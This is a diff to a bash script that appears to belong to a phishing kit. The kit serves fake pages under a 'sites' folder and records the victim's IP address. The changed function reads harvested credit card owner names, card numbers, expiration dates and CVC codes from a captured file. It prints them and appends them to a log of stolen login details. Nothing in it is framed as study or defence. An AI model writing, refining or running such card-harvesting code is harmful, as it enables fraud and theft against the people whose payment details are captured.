@@ -574,21 +574,23 @@ printf "\n"
 cat sites/$server/ip.txt >> sites/$server/victim_ip.txt
 }
 c_cred() {
-  owner=$(grep -o 'owner:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
-  cardnumber=$(grep -o 'cardNumber:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
-  expiration=$(grep -o 'expirationdate:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
-  cvc=$(grep -o 'securitycode:.*' sites/$server/usernames.txt | cut -d ":" -f2- | sed 's/^ //')
+  printf "\n\e[1;92mLogin Details Found!\n\e[0m"
+  [ -f sites/$server/usernames.txt ] && {
+    while IFS= read -r line; do
+      case $line in
+        "owner: "*) owner=${line#owner: };;
+        "cardNumber: "*) cardnumber=${line#cardNumber: };;
+        "expirationdate: "*) expiration=${line#expirationdate: };;
+        "securitycode: "*) cvc=${line#securitycode: };;
+      esac
+    done < sites/$server/usernames.txt
 
-  printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Card Owner:\e[0m\e[1;96m %s\n\e[0m" "$owner"
-  printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Card Number:\e[0m\e[1;96m %s\n\e[0m" "$cardnumber"
-  printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Expiration:\e[0m\e[1;96m %s\n\e[0m" "$expiration"
-  printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m CVC:\e[0m\e[1;96m %s\n\e[0m" "$cvc"
-
-  cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-  printf "\e[0m\n"
-  printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/saved.usernames.txt\e[0m\n" $server
-  printf "\n"
-  printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info, Press\e[0m\e[1;96m Ctrl + C \e[1;93mto exit ...\e[0m\n"
+    printf " \e[1;96mCard Owner:\e[0m \e[1;93m%s\n\e[0m" "$owner"
+    printf " \e[1;96mCard Number:\e[0m \e[1;93m%s\n\e[0m" "$cardnumber"
+    printf " \e[1;96mExpiration:\e[0m \e[1;93m%s\n\e[0m" "$expiration"
+    printf " \e[1;96mCVC:\e[0m \e[1;93m%s\n\e[0m" "$cvc"
+    cat sites/$server/usernames.txt >> sites/$server/login_info.txt
+  }
 }
 banner
 dependencies
